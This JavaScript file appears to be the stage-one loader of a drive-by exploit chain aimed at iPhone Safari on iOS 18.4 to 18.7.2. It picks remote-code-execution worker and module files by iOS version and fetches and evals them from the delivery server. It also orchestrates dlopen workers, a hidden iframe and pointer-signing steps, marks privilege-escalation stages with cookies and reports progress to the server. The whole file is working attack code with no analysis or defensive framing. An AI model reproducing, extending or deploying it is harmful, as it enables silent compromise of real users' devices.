var SERVER_LOG = true;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
var localHost = location.origin;
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    };
    if (dumphex) {
        obj.hex = 1;
        obj.text = x;
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "/log.html?" + req, false);
    xhr.send(null);
}
function markPeDone() {
    // 10min TTL is enforced by frame.html. Cookie is also set by delivery when
    // pe_worker.js is served (covers WebContent death before this runs).
    var ts = String(Date.now());
    try { localStorage.setItem('_x_pe_done', ts); } catch (e) {}
    try {
        document.cookie = '_x_pe_done=' + encodeURIComponent(ts) +
            '; Path=/; Max-Age=600; SameSite=Lax';
    } catch (e2) {}
}
function redirect() {
    // Do NOT navigate (old /404.html caused reload loops with re-entrant frame).
    markPeDone();
    try { if (typeof window.stop === 'function') window.stop(); } catch (e) {}
}
// Relative URLs resolve under /assets/js/; leading-/ paths use location.origin (delivery fallthrough).
// Retries + status/length checks â plain same-origin fetch.
function getJS(fname, method = 'GET', tries = 5) {
    const minLen = 1;
    for (let attempt = 1; attempt <= tries; attempt++) {
        try {
            let url = fname;
            if (typeof fname === 'string' && fname.startsWith('/') && localHost) {
                url = String(localHost).replace(/\/$/, '') + fname;
            }
            if (attempt > 1) {
                const sep = url.indexOf('?') >= 0 ? '&' : '?';
                url = url + sep + '_r=' + attempt;
            }
            const xhr = new XMLHttpRequest();
            xhr.open(method || 'GET', url, false);
            xhr.send(null);
            if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText && xhr.responseText.length >= minLen) {
                return xhr.responseText;
            }
        } catch (e) {
            // retry
        }
    }
}
function iosVersionKey(v) {
    if (!v) return '';
    if (typeof v === 'string') {
        if (v.indexOf('.') >= 0) return v.replace(/\./g, ',');
        return v;
    }
    if (v.join) return v.join(',');
    return String(v);
}
function validateStage1Handoff() {
    if (!device_model) return false;
    if (!offsets || typeof offsets !== 'object') return false;
    if (Object.keys(offsets).length < 40) return false;
    if (slide == null || slide === undefined) return false;
    try {
        if (typeof slide === 'bigint' && slide === 0n) return false;
    } catch (e) {}
    return true;
}
function packOffsetsForTransfer(src) {
    var out = {};
    if (!src) return out;
    try {
        for (var k in src) {
            if (!Object.prototype.hasOwnProperty.call(src, k)) continue;
            var val = src[k];
            out[k] = (val != null && val.toString) ? val.toString() : String(val);
        }
    } catch (e) {}
    return out;
}
function postStage1ToWorker(worker, begin, origin, desiredHost) {
    var msg = {
        type: 'stage1',
        begin: begin,
        origin: origin,
        ios_version: iosVersionKey(ios_version),
        device_model: device_model,
        chipset: chipset,
        slide: (slide != null && slide.toString) ? slide.toString() : '0',
        offsets: packOffsetsForTransfer(offsets),
        desiredHost: desiredHost,
        SERVER_LOG: SERVER_LOG
    };
    try {
        worker.postMessage(msg);
        return true;
    } catch (e) {
        return false;
    }
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);

// LIVE band: iOS 18.4.0 - 18.7.2
function parseIosVersion() {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (!version) {
        const m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(navigator.userAgent);
        if (m) version = m[1];
    }
    if (version) return version.split('_').map(part => parseInt(part, 10));
    return null;
}
function pickLiveBand(v) {
    if (!v || !v.length) return null;
    // historical special-case retained
    if (v[0] === 18 && v[1] === 1 && (v[2] || 0) === 1) {
        return { worker: 'rce_worker_18.6.js', module: 'rce_module_18.6.js', stage1_rce: true, band: '18.6' };
    }
    if (v[0] !== 18) return null;
    const min = v[1] || 0, pat = v[2] || 0;
    if (min < 4 || min > 7) return null;
    if (min === 7 && pat >= 3) return null; // 18.7.3+ patched / out of LIVE
    // 18.7.0-18.7.2: offsets live in worker; module is stub only (do not eval fake 22E/22F table)
    if (min === 7) return { worker: 'rce_worker_18.7.js', module: 'rce_module_18.7.js', stage1_rce: true, band: '18.7' };
    // 18.6.x: same â stub module + self-contained worker
    if (min === 6) return { worker: 'rce_worker_18.6.js', module: 'rce_module_18.6.js', stage1_rce: true, band: '18.6' };
    // 18.4.x / 18.5.x â legacy check_attempt; rce_module.js must have 22E (18.4) + 22F76 (18.5)
    return { worker: 'rce_worker_18.4.js', module: 'rce_module.js', stage1_rce: false, band: '18.4' };
}

const ios_version = parseIosVersion();
// 无需版本判断：固定 iOS 18.6 入口
const live_band = { worker: 'rce_worker_18.6.js', module: 'rce_module_18.6.js', stage1_rce: true, band: '18.6' };
if (!live_band) {
    print('unsupported iOS ' + (ios_version ? ios_version.join('.') : 'unknown') + ' (LIVE=18.4.0-18.7.2)', true);
    redirect();
} else {
let workerCode = getJS(`${live_band.worker}?${Date.now()}`);
if (!workerCode || workerCode.length < 1000) {
    print('worker load failed: ' + live_band.worker, true);
    redirect();
} else {
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                markPeDone();
                doRedirect();
                break;
            }
            case 'pe_start':
            case 'pe_spawned':
            {
                // Early lock: set before pe_worker runs / WebContent dies
                markPeDone();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = getJS(`${live_band.module}?${Date.now()}`);
        // 18.6/18.7 stage1_rce: stub module only â never eval a large offset table on page.
        // 18.4/18.5: need real rce_module.js (22E + 22F76) for check_attempt.
        if (live_band.stage1_rce) {
            if (rceCode && rceCode.length >= 500) {
                print('stage1_rce: refusing large page module ' + live_band.module + ' (len=' + rceCode.length + ') â using worker offsets', true);
            } else if (rceCode && rceCode.length >= 1) {
                try { eval(rceCode); } catch (eStub) {}
            }
        } else {
            if (!rceCode || rceCode.length < 500) {
                print('module load failed: ' + live_band.module, true);
                return;
            }
            try {
                eval(rceCode);
            } catch (e) {
                print('module eval failed', true);
                return;
            }
        }
        let desiredHost = "";
        desiredHost = localHost;
            // 18.6.x / 18.7.0-18.7.2: self-contained worker (stage1_rce)
            // 18.4.x / 18.5.x: check_attempt + stage1 handoff (serialized offsets)
            if(live_band.stage1_rce)
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG
                });
            }
            else
            {
        var attempt = new check_attempt();
        function onAttemptDone(result) {
            if (!result) return;
            if (!validateStage1Handoff()) return;
            postStage1ToWorker(worker, begin, origin, desiredHost);
        }
        attempt.start().then((result) => {
            if (!result) {
                attempt.start().then(onAttemptDone).catch(function () {});
            } else {
                onAttemptDone(true);
            }
        }).catch(function () {});
            }
        }
        catch(e)
        {
       // print("Got exception on something: " + e);
        }
    }
    main();
  })();
} // workerCode ok
} // end live_band
